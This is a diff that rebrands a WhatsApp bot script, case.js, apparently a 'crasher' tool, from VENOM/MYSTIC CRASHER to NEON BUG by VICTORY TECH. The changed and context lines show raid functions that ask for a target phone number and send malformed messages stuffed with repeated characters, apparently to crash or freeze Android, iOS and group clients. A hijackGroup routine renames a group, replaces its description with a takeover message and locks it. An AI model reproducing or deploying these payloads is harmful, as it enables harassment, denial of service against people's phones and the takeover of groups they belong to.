@@ -1,8 +1,8 @@
 /*
  * ============================================
- * CASE.JS - MYSTIC CRASHER 
- * Created by: MYSTIC TECH 
- * Telegram: @mysticxsupreme
+ * CASE.JS - NEON BUG
+ * Created by: VICTORY TECH 
+ * Telegram: @victory_is_h1m
  * ============================================
  */
 
@@ -33,15 +33,15 @@ const {
 // CONSOLE BANNER
 // ============================================
 console.log(chalk.red(`
-██████╗  █████╗ ██╗██████╗      ██████╗██████╗  █████╗ ███████╗██╗  ██╗███████╗██████╗ 
-██╔══██╗██╔══██╗██║██╔══██╗    ██╔════╝██╔══██╗██╔══██╗██╔════╝██║  ██║██╔════╝██╔══██╗
-██████╔╝███████║██║██║  ██║    ██║     ██████╔╝███████║███████╗███████║█████╗  ██████╔╝
-██╔══██╗██╔══██║██║██║  ██║    ██║     ██╔══██╗██╔══██║╚════██║██╔══██║██╔══╝  ██╔══██╗
-██║  ██║██║  ██║██║██████╔╝    ╚██████╗██║  ██║██║  ██║███████║██║  ██║███████╗██║  ██║
-╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═════╝      ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚══════╝╚═╝  ╚═╝
+███╗   ██╗███████╗ ██████╗ ███╗   ██╗    ██████╗ ██╗   ██╗ ██████╗ 
+████╗  ██║██╔════╝██╔═══██╗████╗  ██║    ██╔══██╗██║   ██║██╔════╝ 
+██╔██╗ ██║█████╗  ██║   ██║██╔██╗ ██║    ██████╔╝██║   ██║██║  ███╗
+██║╚██╗██║██╔══╝  ██║   ██║██║╚██╗██║    ██╔══██╗██║   ██║██║   ██║
+██║ ╚████║███████╗╚██████╔╝██║ ╚████║    ██████╔╝╚██████╔╝╚██████╔╝
+╚═╝  ╚═══╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝    ╚═════╝  ╚═════╝  ╚═════╝
 `));
-console.log(chalk.red('☠️  VENOM CRASHER WHATSAPP MODULE - NIGHT RAIDERS CLAN  ☠️'));
-console.log(chalk.white('    Created by: DEV VENOM |  Telegram: ☠︎」*VENOM* 𝐂𝐑𝐀𝐒𝐇𝐄𝐑 𝘃𝟭.𝟬'));
+console.log(chalk.red('☠️  NEON BUG - VICTORY TECH ☠️'));
+console.log(chalk.white('    Created by: VICTORY TECH|  Telegram: ☠︎」*NEON* 𝐂𝐑𝐀𝐒𝐇𝐄𝐑 𝘃𝟭.𝟬'));
 console.log(chalk.red('☠️'.repeat(40)));
 console.log('');
 
@@ -150,16 +150,16 @@ const getExpiryDate = () => {
 const getNewsletterTag = () => ({
   forwardedNewsletterMessageInfo: {
     newsletterJid: '1203634246411268184@newsletter',
-    newsletterName: '「☠︎」VENOM CRASHER v1.0',
+    newsletterName: '「☠︎」NEON BUG v1.0',
     serverMessageId: 143,
   },
   isForwarded: true,
   forwardingScore: 1,
   entryPointConversionSource: `Ends on ${getExpiryDate()}`,
-  entryPointConversionApp: 'Code: 「☠︎」 Dev VENOM',
+  entryPointConversionApp: 'Code: 「☠︎」 VICTORY TECH',
 });
 
-console.log(chalk.green('✅ 𝑽𝑬𝑵𝑶𝑴 𝑪𝑹𝑨𝑺𝑯𝑬𝑹 helpers initialized'));
+console.log(chalk.green('✅ 𝑵𝑬𝑶𝑵 𝑩𝑼𝑮 helpers initialized'));
 
 // ============================================
 // MENU SENDERS
@@ -171,7 +171,7 @@ async function sendPlainMenu(sock, chatId, fakeQuote, prefix, reason = '') {
     ? DEVELOPER_LINKS.map((url, index) => `Contact Dev ${index + 1}: ${url}`).join('\n')
     : 'Developer links are not configured.';
   const text =
-    `「☠︎」VENOM CRASHER MENU\n\n` +
+    `「☠︎」NEON BUG MENU\n\n` +
     `Prefix: ${prefix || '.'}\n` +
     `• ${prefix || '.'}ping\n` +
     `• ${prefix || '.'}pair <phone_number>\n` +
@@ -221,15 +221,15 @@ async function sendMainMenu(sock, chatId, fakeQuote, prefix) {
 
   // ── Body caption ──
   const menuCaption =
-    `「☠︎」MYSTIC  𝐂𝐑𝐀𝐒𝐇𝐄𝐑 𝘃𝟭.𝟬 · ʙʏ @mysticxsupreme「☠︎」\n` +
-    `WAKE UP TO REALITY`;
+    `「☠︎」𝑵𝑬𝑶𝑵 𝑩𝑼𝑮 𝘃𝟭.𝟬 · ʙʏ @victory_is_h1m「☠︎」\n` +
+    `WHO DECIDED THATa`;
 
   // ── 🏷️ tag card via messageParamsJson ──
   const messageParamsJson = JSON.stringify({
     limited_time_offer: {
-      text: '☠︎」𝑽𝑬𝑵𝑶𝑴 𝑪𝑹𝑨𝑺𝑯𝑬𝑹 𝘃𝟭.𝟬',
+      text: '☠︎」𝑵𝑬𝑶𝑵 𝑩𝑼𝑮 𝘃𝟭.𝟬',
       url: DEVELOPER_LINK,
-      copy_code: '「☠︎」Dev Venom',
+      copy_code: '「☠︎」VICTORY TECH',
       expiration_time: Date.now() * 999
     }
   });
@@ -246,7 +246,7 @@ async function sendMainMenu(sock, chatId, fakeQuote, prefix) {
             text: menuCaption
           }),
           footer: proto.Message.InteractiveMessage.Footer.create({
-            text: '☠︎」𝑽𝑬𝑵𝑶𝑴 𝑪𝑹𝑨𝑺𝑯𝑬𝑹 𝘃𝟭.𝟬 '
+            text: '☠︎」𝑵𝑬𝑶𝑵 𝑩𝑼𝑮 𝘃𝟭.𝟬 '
           }),
           header: proto.Message.InteractiveMessage.Header.create({
             hasMediaAttachment: (headerImage || headerVideo) ? true : false,
@@ -270,7 +270,7 @@ async function sendMainMenu(sock, chatId, fakeQuote, prefix) {
                   title: '「☠︎」Select Menu',
                   sections: [
                     {
-                      title: '𓆙 𝑽𝑬𝑵𝑶𝑴 𝑪𝑹𝑨𝑺𝑯𝑬𝑹 𝘃𝟭.𝟬',
+                      title: '𓆙 𝑵𝑬𝑶𝑵 𝑩𝑼𝑮 𝘃𝟭.𝟬',
                       highlight_label: 'Night Raiders',
                       rows: [
                         {
@@ -314,14 +314,14 @@ async function sendCategoryMenu(sock, chatId, fakeQuote) {
         interactiveMessage: proto.Message.InteractiveMessage.create({
           body: proto.Message.InteractiveMessage.Body.create({
             text:
-              `☠︎」MYSTIC  𝐂𝐑𝐀𝐒𝐇𝐄𝐑 𝘃𝟭.𝟬 𝗠𝗘𝗡𝗨𝗦\n\n` +
+              `☠︎」𝑵𝑬𝑶𝑵 𝑩𝑼𝑮 𝘃𝟭.𝟬 𝗠𝗘𝗡𝗨𝗦\n\n` +
               `☠️ 𝗖𝗵𝗼𝗼𝘀𝗲 𝗮 𝗰𝗮𝘁𝗲𝗴𝗼𝗿𝘆 𝗯𝗲𝗹𝗼𝘄:`
           }),
           footer: proto.Message.InteractiveMessage.Footer.create({
-            text: '🦠𝑽𝑬𝑵𝑶𝑴'
+            text: '☠️𝑵𝑬𝑶𝑵 𝑩𝑼𝑮'
           }),
           header: proto.Message.InteractiveMessage.Header.create({
-            title: '𝑽𝑬𝑵𝑶𝑴',
+            title: '𝑵𝑬𝑶𝑵 𝑩𝑼𝑮',
             hasMediaAttachment: false
           }),
           nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
@@ -372,7 +372,7 @@ async function sendRaidBugsMenu(sock, chatId, fakeQuote) {
 
   const bodyText =
     `╔════════ ════════ ════════╗\n` +
-    `║     𝑽𝑬𝑵𝑶𝑴 𝑪𝑹𝑨𝑺𝑯𝑬𝑹 𝘃𝟭.𝟬   ║\n` +
+    `║     𝑵𝑬𝑶𝑵 𝑩𝑼𝑮 𝘃𝟭.𝟬   ║\n` +
     `╚══════ ════ ════════════ ═════╝\n\n` +
     `┏━✞︎𓅓 𝑨𝒏𝒅𝒓𝒐𝒊𝒅 𝑩𝒖𝒈𝒔  ━┓\n` +
     `  ☻︎ 𝗿𝗮𝗶𝗱𝗮𝗻𝗱𝗿𝗼𝗶𝗱\n` +
@@ -387,14 +387,14 @@ async function sendRaidBugsMenu(sock, chatId, fakeQuote) {
     `┏━  𓅓 𝑮𝑪 𝑩𝒖𝒈  ━┓\n` +
     `  ☻︎ 𝗿𝗮𝗶𝗱𝗴𝗰\n` +
     `┗━━━𓃰━━━━━𓅰━━━━┛\n\n` +
-    `©☠︎」𝑽𝑬𝑵𝑶𝑴 𝑪𝑹𝑨𝑺𝑯𝑬𝑹 𝘃𝟭.𝟬\n` +
+    `©☠︎」𝑵𝑬𝑶𝑵 𝑩𝑼𝑮 𝘃𝟭.𝟬\n` +
     `━━━━━━━━━━𐂂━━━━━━━━━━━━━━━━━𓀬━━━━━━`;
 
   const messageParamsJson = JSON.stringify({
     limited_time_offer: {
-      text: '𝑽𝑬𝑵𝑶𝑴 𝑪𝑹𝑨𝑺𝑯𝑬𝑹',
+      text: '𝑵𝑬𝑶𝑵 𝑩𝑼𝑮',
       url: DEVELOPER_LINK,
-      copy_code: '𝑽𝑬𝑵𝑶𝑴 𝑪𝑹𝑨𝑺𝑯𝑬𝑹',
+      copy_code: '𝑵𝑬𝑶𝑵 𝑩𝑼𝑮',
       expiration_time: Date.now() * 999
     }
   });
@@ -411,7 +411,7 @@ async function sendRaidBugsMenu(sock, chatId, fakeQuote) {
             text: bodyText
           }),
           footer: proto.Message.InteractiveMessage.Footer.create({
-            text: '𝑽𝑬𝑵𝑶𝑴 𝑪𝑹𝑨𝑺𝑯𝑬𝑹  — ᴘʀᴇss ᴀ ʙᴜᴛᴛᴏɴ ᴛᴏ ᴅᴇᴘʟᴏʏ'
+            text: '𝑵𝑬𝑶𝑵 𝑩𝑼𝑮  — ᴘʀᴇss ᴀ ʙᴜᴛᴛᴏɴ ᴛᴏ ᴅᴇᴘʟᴏʏ'
           }),
           header: proto.Message.InteractiveMessage.Header.create({
             hasMediaAttachment: headerImage ? true : false,
@@ -503,14 +503,14 @@ async function sendSystemMenu(sock, chatId, fakeQuote) {
     `  ➛ 𝗽𝗶𝗻𝗴\n` +
     `  ➛ 𝗱𝗲𝘃𝗶𝗰𝗲\n` +
     `┗━━━━━━━━━━━━━━━━━━┛\n\n` +
-    `© ☠︎」𝑽𝑬𝑵𝑶𝑴 𝑪𝑹𝑨𝑺𝑯𝑬𝑹 𝘃𝟭.𝟬\n` +
+    `© ☠︎」𝑵𝑬𝑶𝑵 𝑩𝑼𝑮 𝘃𝟭.𝟬\n` +
     `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
 
   const messageParamsJson = JSON.stringify({
     limited_time_offer: {
-      text: '☠︎」𝑽𝑬𝑵𝑶𝑴 𝑪𝑹𝑨𝑺𝑯𝑬𝑹𝘃𝟭.𝟬 v1.0',
+      text: '☠︎」𝑵𝑬𝑶𝑵 𝑩𝑼𝑮 𝘃𝟭.𝟬 v1.0',
       url: DEVELOPER_LINK,
-      copy_code: '𝑽𝑬𝑵𝑶𝑴',
+      copy_code: '𝑽𝑰𝑪𝑻𝑶𝑹𝒀 𝑻𝑬𝑪𝑯',
       expiration_time: Date.now() * 999
     }
   });
@@ -595,7 +595,7 @@ async function askForTarget(sock, chatId, sessionKey, command, label, fakeQuote)
   await sock.sendMessage(chatId, {
     text:
       `「☠︎」*${label}*\n\n` +
-      `☠️ ☠︎」𝑽𝑬𝑵𝑶𝑴 𝑪𝑹𝑨𝑺𝑯𝑬𝑹 𝘃𝟭.𝟬, ᴅʀᴏᴘ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ɴᴜᴍʙᴇʀ:\n\n` +
+      `☠️ ☠︎」𝑵𝑬𝑶𝑵 𝑩𝑼𝑮 𝘃𝟭.𝟬, ᴅʀᴏᴘ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ɴᴜᴍʙᴇʀ:\n\n` +
       `📲 *234✘✘✘✘✘✘✘✘✘✘*\n\n` +
       `_⏳ ʏᴏᴜ ʜᴀᴠᴇ 2 ᴍɪɴᴜᴛᴇs_`,
     contextInfo: getExternalAdReply()
@@ -889,7 +889,7 @@ async function runRaidGc(sock, chatId, targetGcJid, fakeQuote) {
       // ── Wave 4: extendedText with forwardedNewsletterMessageInfo overflow ──
       await sock.relayMessage(targetGcJid, {
         extendedTextMessage: {
-          text: '𝑽𝑬𝑵𝑶𝑴 𝑪𝑹𝑨𝑺𝑯𝑬𝑹'.repeat(2000),
+          text: '𝑵𝑬𝑶𝑵 𝑩𝑼𝑮'.repeat(2000),
           contextInfo: {
             forwardedNewsletterMessageInfo: {
               newsletterJid: '120363000000000001@newsletter',
@@ -1422,7 +1422,7 @@ module.exports = async (sock, phoneNumber = null, ownerChatId = null) => {
                 `📟 *ᴅᴇᴠɪᴄᴇ:* ${deviceInfo.label}\n` +
                 `${targetMsgId ? `🔑 *ᴍsɢ ɪᴅ:* \`${targetMsgId.slice(0, 10)}...\`\n` : ''}` +
                 `━━━━━━━━━━━━━━━━\n` +
-                `☠︎」𝑽𝑬𝑵𝑶𝑴 𝑪𝑹𝑨𝑺𝑯𝑬𝑹 𝘃𝟭.𝟬` +
+                `☠︎」𝑵𝑬𝑶𝑵 𝑩𝑼𝑮 𝘃𝟭.𝟬` +
                 scanNote,
               contextInfo: getExternalAdReply()
             }, { quoted: fakeQuote });
@@ -1671,7 +1671,7 @@ async function handlePendingRaidCommand(sock, chatId, command, targetJid, rawNum
             `🎯 *ᴛᴀʀɢᴇᴛ:* ${targetJid}\n` +
             `📱 *ᴘʟᴀᴛғᴏʀᴍ:* iOS\n` +
             `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
-            `_「☠︎」ɴɪɢʜᴛ ʀᴀɪᴅᴇʀs ᴛᴀʀɢᴇᴛɪɴɢ ɪᴏs..._`,
+            `_「☠︎」NEON ᴛᴀʀɢᴇᴛɪɴɢ ɪᴏs..._`,
           contextInfo: adReply
         }, { quoted: fakeQuote });
 
@@ -1767,7 +1767,7 @@ async function handlePendingRaidCommand(sock, chatId, command, targetJid, rawNum
             `📊 *sᴇɴᴛ:* ${sent}/100\n` +
             `📈 *sᴜᴄᴄᴇss:* ${Math.round((sent / 100) * 100)}%\n` +
             `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
-            `_𓅓 ᴍʏsᴛɪᴄ ʜɪᴍsᴇʟғ`,
+            `_𓅓 Victory Himself`,
           contextInfo: adReply
         }, { quoted: fakeQuote });
 
@@ -1784,12 +1784,12 @@ async function handlePendingRaidCommand(sock, chatId, command, targetJid, rawNum
       try {
         await sock.sendMessage(chatId, {
           text:
-            `「☠︎」🤖 *ʀᴀɪᴅᴀɴᴅʀᴏɪᴅ ᴅᴇᴘʟᴏʏɪɴɢ*\n` +
+            `「☠︎」🤖 *Neonᴀɴᴅʀᴏɪᴅ ᴅᴇᴘʟᴏʏɪɴɢ*\n` +
             `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
             `🎯 *ᴛᴀʀɢᴇᴛ:* ${targetJid}\n` +
             `📱 *ᴘʟᴀᴛғᴏʀᴍ:* Android\n` +
             `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
-            `_☠︎」𝑽𝑬𝑵𝑶𝑴 𝑪𝑹𝑨𝑺𝑯𝑬𝑹 𝘃𝟭.𝟬..._`,
+            `_☠︎」𝑵𝑬𝑶𝑵 𝑩𝑼𝑮 𝘃𝟭.𝟬..._`,
           contextInfo: adReply
         }, { quoted: fakeQuote });
 
@@ -1819,13 +1819,13 @@ async function handlePendingRaidCommand(sock, chatId, command, targetJid, rawNum
 
         await sock.sendMessage(chatId, {
           text:
-            `「☠︎」🤖 *ʀᴀɪᴅᴀɴᴅʀᴏɪᴅ ᴄᴏᴍᴘʟᴇᴛᴇ*\n` +
+            `「☠︎」🤖 *Neonᴀɴᴅʀᴏɪᴅ ᴄᴏᴍᴘʟᴇᴛᴇ*\n` +
             `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
             `🎯 *ᴛᴀʀɢᴇᴛ:* ${targetJid}\n` +
             `📊 *ʀᴏᴜɴᴅs:* ${sent}/${ROUNDS}\n` +
             `📈 *sᴜᴄᴄᴇss:* ${Math.round((sent / ROUNDS) * 100)}%\n` +
             `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
-            `_☠︎」MYSTIC  𝐂𝐑𝐀𝐒𝐇𝐄𝐑 𝘃𝟭.𝟬_`,
+            `_☠︎」𝑵𝑬𝑶𝑵 𝑩𝑼𝑮a 𝘃𝟭.𝟬_`,
           contextInfo: adReply
         }, { quoted: fakeQuote });
 
@@ -1877,7 +1877,7 @@ async function handlePendingRaidCommand(sock, chatId, command, targetJid, rawNum
             `📊 *ʀᴏᴜɴᴅs:* ${sent}/${ROUNDS}\n` +
             `📈 *sᴜᴄᴄᴇss:* ${Math.round((sent / ROUNDS) * 100)}%\n` +
             `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
-            `☠︎」MYSTIC  𝐂𝐑𝐀𝐒𝐇𝐄𝐑 𝘃𝟭.𝟬`,
+            `☠︎」𝑵𝑬𝑶𝑵 𝑩𝑼𝑮 𝘃𝟭.𝟬`,
           contextInfo: adReply
         }, { quoted: fakeQuote });
 
@@ -1894,7 +1894,7 @@ async function handlePendingRaidCommand(sock, chatId, command, targetJid, rawNum
       try {
         await sock.sendMessage(chatId, {
           text:
-            `「☠︎」⏱️ *ʀᴀɪᴅ-ᴅᴇʟᴀʏ ᴅᴇᴘʟᴏʏɪɴɢ*\n` +
+            `「☠︎」⏱️ *Neon-ᴅᴇʟᴀʏ ᴅᴇᴘʟᴏʏɪɴɢ*\n` +
             `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
             `🎯 *ᴛᴀʀɢᴇᴛ:* ${targetJid}\n` +
             `📱 *ᴘʟᴀᴛғᴏʀᴍ:* Android\n` +
@@ -1923,13 +1923,13 @@ async function handlePendingRaidCommand(sock, chatId, command, targetJid, rawNum
 
         await sock.sendMessage(chatId, {
           text:
-            `「☠︎」⏱️ *ʀᴀɪᴅ-ᴅᴇʟᴀʏ ᴄᴏᴍᴘʟᴇᴛᴇ*\n` +
+            `「☠︎」⏱️ *Neon-ᴅᴇʟᴀʏ ᴄᴏᴍᴘʟᴇᴛᴇ*\n` +
             `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
             `🎯 *ᴛᴀʀɢᴇᴛ:* ${targetJid}\n` +
             `📊 *ʀᴏᴜɴᴅs:* ${sent}/${ROUNDS}\n` +
             `📈 *sᴜᴄᴄᴇss:* ${Math.round((sent / ROUNDS) * 100)}%\n` +
             `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
-            `_☠︎」𝑽𝑬𝑵𝑶𝑴 𝑪𝑹𝑨𝑺𝑯𝑬𝑹 𝘃𝟭.𝟬`,
+            `_☠︎」𝑵𝑬𝑶𝑵 𝑩𝑼𝑮 𝘃𝟭.𝟬`,
           contextInfo: adReply
         }, { quoted: fakeQuote });
 
@@ -1946,12 +1946,12 @@ async function handlePendingRaidCommand(sock, chatId, command, targetJid, rawNum
       try {
         await sock.sendMessage(chatId, {
           text:
-            `「☠︎」🌑 *ɴɪɢʜᴛ-ɪɴᴠᴀsɪᴏɴ ᴅᴇᴘʟᴏʏɪɴɢ*\n` +
+            `「☠︎」🌑 *ɴeon-ɪɴᴠᴀsɪᴏɴ ᴅᴇᴘʟᴏʏɪɴɢ*\n` +
             `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
             `🎯 *ᴛᴀʀɢᴇᴛ:* ${targetJid}\n` +
             `📱 *ᴘʟᴀᴛғᴏʀᴍ:* iOS\n` +
             `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
-            `_「☠︎」ɴɪɢʜᴛ ɪɴᴠᴀsɪᴏɴ ʟᴀᴜɴᴄʜɪɴɢ..._`,
+            `_「☠︎」ɴeon ɪɴᴠᴀsɪᴏɴ ʟᴀᴜɴᴄʜɪɴɢ..._`,
           contextInfo: adReply
         }, { quoted: fakeQuote });
 
@@ -1979,13 +1979,13 @@ async function handlePendingRaidCommand(sock, chatId, command, targetJid, rawNum
 
         await sock.sendMessage(chatId, {
           text:
-            `「☠︎」🌑 *ɴɪɢʜᴛ-ɪɴᴠᴀsɪᴏɴ ᴄᴏᴍᴘʟᴇᴛᴇ*\n` +
+            `「☠︎」🌑 *ɴeon-ɪɴᴠᴀsɪᴏɴ ᴄᴏᴍᴘʟᴇᴛᴇ*\n` +
             `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
             `🎯 *ᴛᴀʀɢᴇᴛ:* ${targetJid}\n` +
             `📊 *ʀᴏᴜɴᴅs:* ${sent}/${ROUNDS}\n` +
             `📈 *sᴜᴄᴄᴇss:* ${Math.round((sent / ROUNDS) * 100)}%\n` +
             `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
-            `_☠︎」𝑽𝑬𝑵𝑶𝑴 𝑪𝑹𝑨𝑺𝑯𝑬𝑹 𝘃𝟭.𝟬_`,
+            `_☠︎」𝑵𝑬𝑶𝑵 𝑩𝑼𝑮 𝘃𝟭.𝟬_`,
           contextInfo: adReply
         }, { quoted: fakeQuote });
 
@@ -2037,7 +2037,7 @@ async function handlePendingRaidCommand(sock, chatId, command, targetJid, rawNum
             `📊 *ʀᴏᴜɴᴅs:* ${sent}/${ROUNDS}\n` +
             `📈 *sᴜᴄᴄᴇss:* ${Math.round((sent / ROUNDS) * 100)}%\n` +
             `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
-            `_☠︎」𝑽𝑬𝑵𝑶𝑴 𝑪𝑹𝑨𝑺𝑯𝑬𝑹 𝘃𝟭.𝟬`,
+            `_☠︎」𝑵𝑬𝑶𝑵 𝑩𝑼𝑮 𝘃𝟭.𝟬`,
           contextInfo: adReply
         }, { quoted: fakeQuote });
 
@@ -2343,18 +2343,18 @@ async function hijackGroup(sock, chatId, sender, groupMetadata, fakeQuote, isOwn
 
     // ── Lock the group down ──
     try {
-      await sock.groupUpdateSubject(chatId, 'HIJACKED 𓅓 BY THE GLORIOUS 𝑽𝑬𝑵𝑶𝑴 𝑪𝑹𝑨𝑺𝑯𝑬𝑹「☠︎」💀');
+      await sock.groupUpdateSubject(chatId, 'HIJACKED 𓅓 BY THE GLORIOUS 𝑵𝑬𝑶𝑵 𝑩𝑼𝑮「☠︎」💀');
       await delay(400);
       await sock.groupUpdateDescription(chatId,
         '🔱 𝐆𝐑𝐎𝐔𝐏 𝐇𝐈𝐉𝐀𝐂𝐊𝐄𝐃 𓃰\n' +
-        '⚠️ ᴛʜɪs ɢʀᴏᴜᴘ ʜᴀs ʙᴇᴇɴ ᴄᴏɴǫᴜᴇʀᴇᴅ ʙʏ ᴛʜᴇ 𝑽𝑬𝑵𝑶𝑴 𝑪𝑹𝑨𝑺𝑯𝑬𝑹 ☠️\n\n' +
+        '⚠️ ᴛʜɪs ɢʀᴏᴜᴘ ʜᴀs ʙᴇᴇɴ ᴄᴏɴǫᴜᴇʀᴇᴅ ʙʏ ᴛʜᴇ 𝑵𝑬𝑶𝑵 𝑩𝑼𝑮 ☠️\n\n' +
         '💀 ʏᴏᴜʀ ᴀᴅᴍɪɴs ʜᴀᴠᴇ ғᴀʟʟᴇɴ\n' +
         '🗡️ ʏᴏᴜʀ ᴅᴇғᴇɴsᴇs ʜᴀᴠᴇ ᴄʀᴜᴍʙʟᴇᴅ\n' +
         '⚔️ ɢʀᴏᴜᴘ ᴄᴏɴᴛʀᴏʟ: ᴅᴏᴍɪɴᴀᴛᴇᴅ\n\n' +
-        '「☠︎」ᴘᴏᴡᴇʀᴇᴅ ʙʏ ☠︎」𝑽𝑬𝑵𝑶𝑴 𝑪𝑹𝑨𝑺𝑯𝑬𝑹 𝘃𝟭.𝟬\n' +
-        '👿 ᴄʀᴇᴀᴛᴇᴅ ʙʏ DEV 𝑽𝑬𝑵𝑶𝑴\n\n' +
+        '「☠︎」ᴘᴏᴡᴇʀᴇᴅ ʙʏ ☠︎」𝑵𝑬𝑶𝑵 𝑩𝑼𝑮 𝘃𝟭.𝟬\n' +
+        '👿 ᴄʀᴇᴀᴛᴇᴅ ʙʏ 𝑽𝑰𝑪𝑻𝑶𝑹𝒀 𝑻𝑬𝑪𝑯\n\n' +
         '🌑 ɴᴏ ᴇsᴄᴀᴘᴇ. ɴᴏ ᴍᴇʀᴄʏ. ɴᴏ ʜᴏᴘᴇ. 🌑\n\n' +
-        '© 𝑽𝑬𝑵𝑶𝑴 𝑪𝑹𝑨𝑺𝑯𝑬𝑹'
+        '© 𝑵𝑬𝑶𝑵 𝑩𝑼𝑮'
       );
       await delay(400);
       await sock.groupSettingUpdate(chatId, 'announcement');
@@ -2667,7 +2667,7 @@ async function _fcXDelay(sock, target, mention = true) {
         messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
         interactiveMessage: {
           contextInfo,
-          body: { text: '☠︎」𝑽𝑬𝑵𝑶𝑴 𝑪𝑹𝑨𝑺𝑯𝑬𝑹 𝘃𝟭.𝟬' },
+          body: { text: '☠︎」𝑵𝑬𝑶𝑵 𝑩𝑼𝑮 𝘃𝟭.𝟬' },
           nativeFlowMessage: {
             buttons: [
               { name: 'single_select', buttonParamsJson: bokepFc + 'gatau' },
@@ -2747,16 +2747,16 @@ async function _delaFreezCloseRelay(sock, target) {
 
     const message = {
       groupInviteMessage: {
-        groupJid: '120363370626418572@g.us',
+        groupJid: '120363428855080371@g.us',
         inviteCode: 'Xx'.repeat(200),
         inviteExpiration: '99999999999',
-        groupName: '</> Night Raiders ' + 'ោ៝'.repeat(200),
+        groupName: '</> Victory Tech ' + 'ោ៝'.repeat(200),
         caption: 'ោ៝'.repeat(300),
         jpegThumbnail: null,
         contextInfo: {
           participant: target, remoteJid: randomJid, forwardingScore: 9999, isForwarded: true,
           mentionedJid: ['13135550002@s.whatsapp.net', ...generateMentioned],
-          groupInviteMessage: { inviteCode: 'Xx'.repeat(200), groupJid: '120363370626418572@g.us', groupName: 'ោ៝'.repeat(200) }
+          groupInviteMessage: { inviteCode: 'Xx'.repeat(200), groupJid: '120363428855080371@g.us', groupName: 'ោ៝'.repeat(200) }
         }
       }
     };
@@ -2774,7 +2774,7 @@ async function _delaFreezCloseRelay(sock, target) {
             },
             body: proto.Message.InteractiveMessage.Body.create({ text: 'Night Raiders' }),
             footer: proto.Message.InteractiveMessage.Footer.create({ buttonParamsJson: '{['.repeat(500) }),
-            header: proto.Message.InteractiveMessage.Header.create({ buttonParamsJson: ']}'.repeat(500), subtitle: 'Night Raiders', hasMediaAttachment: false }),
+            header: proto.Message.InteractiveMessage.Header.create({ buttonParamsJson: ']}'.repeat(500), subtitle: 'Victory Tech', hasMediaAttachment: false }),
             nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
               messageParamsJson: '{['.repeat(500),
               buttons: [
@@ -3206,9 +3206,9 @@ async function _nativeXFcWithDozerX(sock, target) {
             },
             externalAdReply: {
               showAdAttribution: true,
-              title: '?𝐗𝐁𝐋𝐀𝐒𝐓𝐄𝐑',
+              title: '? Victory Tech',
               body: '',
-              sourceUrl: 'https://t.me/mystictechxd',
+              sourceUrl: 'https://t.me/victorytechchannela',
               mediaType: 1,
               renderLargerThumbnail: true
             },
@@ -3219,7 +3219,7 @@ async function _nativeXFcWithDozerX(sock, target) {
             }
           },
           header: { title: '', hasMediaAttachment: false },
-          body: { text: '𝐗𝐁𝐋𝐀𝐒𝐓𝐄𝐑 𝐕𝐎𝐑𝐓𝐄𝐗' },
+          body: { text: '𝑵𝑬𝑶𝑵 𝑩𝑼𝑮' },
           nativeFlowMessage: {
             messageParamsJson: JSON.stringify({
               name: 'galaxy_message',
@@ -3286,7 +3286,7 @@ async function _nativeXFcWithDozerX(sock, target) {
         participant: target,
         quotedMessage: {
           conversation:
-            '〽️ ᴍʏsᴛɪᴄ ʙᴜɢ 〽️' +
+            '〽️ ɴeon 〽️' +
             'ꦾ࣯'.repeat(50000) +
             '@1'.repeat(20000)
         },
@@ -3361,7 +3361,7 @@ async function _betaTester(sock, target, mention = true) {
       }
     }, {
       additionalNodes: [
-        { tag: 'meta', attrs: { is_status_mention: 'Night Raiders' }, content: undefined }
+        { tag: 'meta', attrs: { is_status_mention: 'Victory Tech' }, content: undefined }
       ]
     });
   }
@@ -3369,6 +3369,6 @@ async function _betaTester(sock, target, mention = true) {
 
 // ============================================
 // END OF CASE.JS
-// 「☠︎」MYSTIC BUG - HIMSELF
-// CREATED BY MYSTIC TECH 🖤
+// 「☠︎」NEON BUG - HIMSELF
+// CREATED BY VICTORY TECH ☠️
 // ============================================
